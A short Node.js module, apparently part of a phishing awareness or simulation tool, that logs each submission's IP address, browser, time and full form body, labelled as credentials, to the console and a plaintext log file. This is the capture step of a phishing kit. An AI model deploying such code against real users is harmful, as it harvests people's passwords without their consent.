const fs = require("fs");
const path = require("path");

const logFile = path.join(__dirname, "../logs/awareness_log.txt");

function logAttempt(platform, req) {

    const ip =
        req.headers["x-forwarded-for"] ||
        req.socket.remoteAddress ||
        "Unknown IP";

    const userAgent = req.headers["user-agent"];

    const timestamp = new Date().toString();

    const credentials = JSON.stringify(req.body);

    const logData = `
=====================================
Platform : ${platform}
Time : ${timestamp}
IP : ${ip}
Browser : ${userAgent}

Entered Data:
${credentials}

=====================================
`;

    /* Print in terminal */

    console.log(logData);

    /* Save in file */

    fs.appendFileSync(logFile, logData);
}

module.exports = logAttempt;